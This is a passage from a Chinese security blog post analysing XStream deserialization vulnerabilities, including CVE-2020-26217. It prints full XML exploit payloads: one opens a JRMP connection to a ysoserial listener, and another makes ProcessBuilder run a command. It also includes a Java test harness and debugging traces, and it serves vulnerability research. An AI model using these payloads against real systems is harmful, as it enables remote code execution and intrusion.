class="name">environment</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">registry</span> <span class="attr">class</span>=<span class="string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>UnicastRef<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>10.122.206.12<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">short</span>&gt;</span>0<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>false<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">registry</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">host</span>&gt;</span>10.122.206.12<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">port</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">candidates</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">aliases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nullIter</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">sm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>验证payload的类代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 读取 xml 文件</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">fileinput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/main/java/com/test/payload.xml&quot;</span>);</span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dbFactory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">dBuilder</span> <span class="operator">=</span> dbFactory.newDocumentBuilder();</span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> dBuilder.parse(fileinput);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将xml文件转化为String</span></span><br><span class="line">            <span class="type">DOMSource</span> <span class="variable">domSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DOMSource</span>(doc);</span><br><span class="line">            <span class="type">StringWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">            <span class="type">StreamResult</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamResult</span>(writer);</span><br><span class="line">            <span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> tf.newTransformer();</span><br><span class="line">            transformer.transform(domSource, result);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> writer.toString();</span><br><span class="line">            <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">            xStream.fromXML(payload);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>启动ysoserial的jrmp监听服务然后开始调试。首先就是调用xstream自带的解析函数进行解析，fromXML()函数</p>
+
+<p>从payload我们可以观察到<code>&lt;java.util.PriorityQueue serialization='custom'&gt;</code>是整个攻击链的触发点，所以我们可以去PriorityQueue的readobject函数进行断点调试。</p>
+
+<p>在这个queue[i] =
+s.readobject()当中会调用SerializableConverter#doUnmarshal函数，这个函数会获得我们在payload当中使用的类。走过一系列嵌套调用后，获得调用JRMP的关键类sun.rmi.registry.RegistryImpl_Stub</p>
+
+<p>RegistryImpl_Stub被调用了readObject方法，然后多步调试后来到UnicastRef#readExternal下面，其中调用了LiveRef（对于这个东西我们其实并不陌生，很多次的JRMP链接都是从这里开始的）</p>
+
+<p>最终会调用到DGCClient.registerRefs调用了去建立JRMP链接。</p>
+
+<p>最终结果</p>
+
+<p>所以我们经过调试之后我们发现最关键的类就是RegistryImpl_Stub，所以我们可以直接使用RegistryImpl_Stub类进行反序列化，payload如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sun.rmi.registry.RegistryImpl_Stub</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>UnicastRef<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>10.122.206.12<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">short</span>&gt;</span>0<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>false<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sun.rmi.registry.RegistryImpl_Stub</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h6 id="总结">总结</h6>
+<p><strong>该漏洞的成因，主要是因为XStream对于实现了Serializable接口的类产生的对象，在对其进行反序列化时，会调用其自定义的readObject。而此Payload中RemoteObject类的readObject的方法又会产生RMI调用，造成了漏洞的利用。</strong></p>
+<h6 id="漏洞修复">漏洞修复</h6>
+<p>XStream-1.4.17采用黑名单的方式修复漏洞，采用正则过滤掉了与rmi相关的类名</p>
+<h5 id="cve-2020-26217">CVE-2020-26217</h5>
+<p>上面的漏洞分析完成过后，我们可以发现一点，上面这个漏洞的poc虽然最后可以化成非常简单的几行poc，但是他的利用范围是比较小的必须配合其他的含有漏洞的库一起利用，也就是需要依赖于其他的gadget</p>
+<h6 id="影响范围">影响范围：</h6>
+<p>&lt;=1.4.13</p>
+<h6 id="漏洞分析">漏洞分析</h6>
+<p>在正式进行漏洞分析之前，构造如下的一个例子来看一下XStream它的反序列化的结果。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> map2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="keyword">new</span> <span class="title class_">person</span>(<span class="string">&quot;fanxing&quot;</span>,<span class="number">18</span>), <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(map);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述代码的运行结果如下</p>
+<img data-src="/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/26259%E5%88%86%E6%9E%90.png" class>
+<p>XStream将map进行序列化的时候，会为每一个entry对象生成一个<code>&lt;entry&gt;&lt;/entry&gt;</code>元素，并将Entry里面的key和value中尉其子元素放在第一和第二顺位。这里的Entry指的就是在map当中的键值对。</p>
+<p>现在来看官方所给出的payload。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>把他折叠一下，我们可以得到下面的一些内容，通过上面的分析，我们发现这个payload就是一个map对象，里面放了一个value和key，其中key是一个jdk.nashorn.internal.objects.NativeString对象。</p>
+
+<p>我们再展开看里面的一些细节问题，jdk.nashorn.internal.objects.NativeString对象里面的value属性被设置为<code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code>然后还有一个dataHandler属性这里面还被设置了一些其他值。</p>
+
+<p>接下来开始正式的分析，首先我们来到AbstractTreeMarshallingStrategy#start函数</p>
+
+<p>下面两个函数都是关键：第一个readClasstype()这个函数可以获取我们在xml当中定义的类map。</p>
+
+<p>然后单步进入convertAnother函数，看其内部细节</p>
+
+<p>首先type获取到的值为hashmap，这会为后面的利用埋下伏笔。最终这个会来到下面这行代码。</p>
+
+<p>然后连续跟踪代码，经历如下的调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractReferenceUnmarshaller#convert-&gt;TreeUnmarshaller#convert-&gt;MapConverter#populateMap-&gt;MapConverter#putCurrentEntryIntoMap</span><br></pre></td></tr></table></figure>
+<p>最终会在putCurrentEntryIntoMap这个方法当中调用put方法触发hash()，经过调用后触发hashcode从而实现gadget利用。</p>
+<p>原则意义上讲整个代码的触发应该在put函数，但是在本地调试的时候会在readCompleteItem()处触发，原因尚不明确。所以只能通过payload反推利用链。</p>
+
+<p>put函数中的逻辑应该会调用putVal()函数，里面会调用hash()方法对entry的键（key）进行hash，从而会调用jdk.nashorn.internal.objects.NativeString的hashcode方法。从下图可知hashCode里面调用了getStringValue()方法，这个方法会判断value这个值是不是继承自String。</p>
+<img data-src="/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/26259%E5%88%86%E6%9E%90.jpg" class>
+<p>回看payload我们发现value这个值被我们设置为如下的代码段</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所以上述代码的执行就变成了调用com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString()方法。来到Base64Data类里面，找到toString()方法调用了this.get()</p>
+
+<p>单步跟进到get()方法当中，按照正常的执行逻辑这里的分支应该是进this.data==null这个分支。但是在我验证payload的时候，这行分支并没有执行而是转而走向了另外一个分支。但是我们仍要分析这个过程。里面有一行代码<code>this.dataHandler.getDataSource().getInputStream()</code></p>
+
+<p>我们对应到payload的里面dataHandler里面的dataSource被定义为XmlDataSource类。那么这行代码的逻辑就是调用XmlDataSource#getInputStream</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataHandler&gt;</span><br><span class="line">                    &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<p>单步跟进函数，这个函数最终会返回一个this.is的InputStream类及其子类</p>
+
+<p>这个is在在payload被定义为了java.io.SequenceInputStream</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们再回到之前的get()方法当中，在执行完返回了is变量后，代码把is传入了readForm()函数。单步进入readForm()方法，里面调用了read()方法遂单步进入read()方法。</p>
+
+<p>这个代码逻辑最终会走到nextStream()方法并进行调用，所以继续往下走。</p>
+
+<p>单步跟进到nextStream()里面涉及到了一个变量e</p>
+
+<p>这个e在payload中被定义为，在上面的代码逻辑当中它会调用自己的nextElement()方法</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上面名为nextElement的方法中涉及到了iterator变量，并调用了其中的next()方法。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>紧接着进入advance()方法，且advance方法当中涉及了变量iter</p>
+
+<p>payload当中的iter定义为，单步进入其中的next()方法</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里面填充了payload当中的最关键的命令执行的地方</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                       <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                       <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                       <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                           <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                               <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                                                   <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                               <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                                           <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                       <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这一步的逻辑是事实上就是把我们精心构造的payload在数组中进行填充，然后返回。我们再回到advace()方法在调用完next()方法之后，又调用了filter.filter()方法。在这里面完成了方法的调用。</p>
+
+<h4 id="section"></h4>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>f4nx1ng
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://f4nx1ng.github.io/2024/08/19/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Xstream反序列化漏洞">https://f4nx1ng.github.io/2024/08/19/Xstream反序列化漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+              <a href="/tags/Xstream/" rel="tag"># Xstream</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/" rel="prev" title="Struts漏洞分析合集">
+                  <i class="fa fa-angle-left"></i> Struts漏洞分析合集
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/08/19/%E5%85%B3%E4%BA%8EtoString%E6%96%B9%E6%B3%95%E4%B8%8Egetter%E6%96%B9%E6%B3%95%E5%9C%A8%E5%88%A9%E7%94%A8%E9%93%BE%E6%8B%BC%E5%87%91%E6%96%B9%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/" rel="next" title="关于toString方法与getter方法在利用链拼凑方面的总结">
+                  关于toString方法与getter方法在利用链拼凑方面的总结 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">f4nx1ng</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
